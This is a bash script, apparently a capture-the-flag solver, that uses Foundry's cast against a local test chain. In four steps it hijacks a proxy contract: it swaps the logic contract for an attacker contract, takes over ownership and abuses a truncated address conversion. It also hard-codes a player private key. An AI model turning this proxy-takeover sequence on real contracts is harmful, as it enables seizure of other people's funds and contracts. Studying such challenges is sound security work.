#!/bin/bash
# Set the variables
PRIVATE_KEY_PLAYER="0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
TARGET_LOGIC="0x5FbDB2315678afecb367f032d93F642f64180aa3"
TARGET_CS3PROXY="0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"
ENDPOINT="http://127.0.0.1:8545/"

ADDRESS_PLAYER=$(cast wallet address $PRIVATE_KEY_PLAYER)
OWNER_CS3PROXY=$(cast parse-bytes32-address "$(cast storage $TARGET_CS3PROXY 0 --rpc-url $ENDPOINT)")

ATTACKER_CONTRACT="0x8464135c8F25Da09e49BC8782676a84730C318bC"

isSolved() {
	RET=$(cast --to-dec $(cast call $TARGET_CS3PROXY "isSolved()" --rpc-url $ENDPOINT))
	TRUE="1"
	if [ "$RET" -eq "$TRUE" ]; then
		echo "Solved"
	else
		echo "Not Solved Yet"
	fi
}

StepOne() {
	echo "[+]Changing Str.Z boolean Value"
	TOSEND=$(cast calldata "FirstStep(bool)" true)
	cast send $TARGET_CS3PROXY "update(bytes, address)" $TOSEND $ATTACKER_CONTRACT --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
	isSolved
}

StepTwo() {
	echo "[+]Modifying Address of The Logic Contract"
	cast send $TARGET_CS3PROXY "upgrade(address)" $ATTACKER_CONTRACT --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
	isSolved
}

StepThree() {
	echo "[+]Changing Owner of The Proxy"
	TOSEND=$(cast calldata "SecondStep(address)" $ADDRESS_PLAYER)
	cast send $TARGET_CS3PROXY "update(bytes, address)" $TOSEND $ADDRESS_PLAYER --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
	isSolved
}

StepFour() {
	echo "[+]Truncating conversion to address from bytes32"
	TOSEND=$(cast calldata "FinalStep(address)" $ADDRESS_PLAYER)
	cast send $TARGET_CS3PROXY "checkValid(bytes)" $TOSEND --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
	isSolved
}

StepOne
StepTwo
StepThree
StepFour
